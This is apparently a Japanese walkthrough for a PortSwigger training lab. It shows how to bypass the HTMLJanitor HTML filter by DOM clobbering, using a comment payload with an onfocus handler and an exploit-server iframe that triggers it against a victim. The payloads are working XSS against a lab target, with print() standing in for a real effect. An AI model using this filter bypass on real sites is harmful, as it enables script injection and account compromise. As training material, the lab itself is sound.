# DOM 属性を上書きして HTML フィルターをバイパスする

次のハッキングラボを実施する  
https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters  
このラボでは HTMLJanitor ライブラリを使用しますが、これは DOM 破壊に対して脆弱です。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 任意のブログに移動し、次のコメントを書き込みます

```html
<form id="x" tabindex="0" onfocus="print()"><input id="attributes" /></form>
```

- 4. エクスプロイトサーバにボディに次の内容を入力  
     postId はコメントを残したブログの id に合わせる必要があります

```
<iframe src=https://0a610097045aa8a981c684320011002d.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

- 5. Save ボタン押下後に Deliver Exploit to victim ボタン押下。
